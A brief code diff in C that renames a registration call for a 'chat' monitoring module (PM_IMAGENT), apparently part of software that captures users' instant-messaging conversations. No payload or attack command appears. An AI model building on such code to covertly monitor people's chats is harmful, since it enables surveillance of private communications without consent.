@@ -414,5 +414,5 @@ DWORD __stdcall PM_IMInit(JSONObject elem)
 
 void PM_IMRegister()
 {
-	AM_MonitorRegisterBSON(L"chat", PM_IMAGENT, (BYTE *)PM_IMDispatch, (BYTE *)PM_IMStartStop, (BYTE *)PM_IMInit, NULL);
+	AM_MonitorRegister(L"chat", PM_IMAGENT, (BYTE *)PM_IMDispatch, (BYTE *)PM_IMStartStop, (BYTE *)PM_IMInit, NULL);
 }
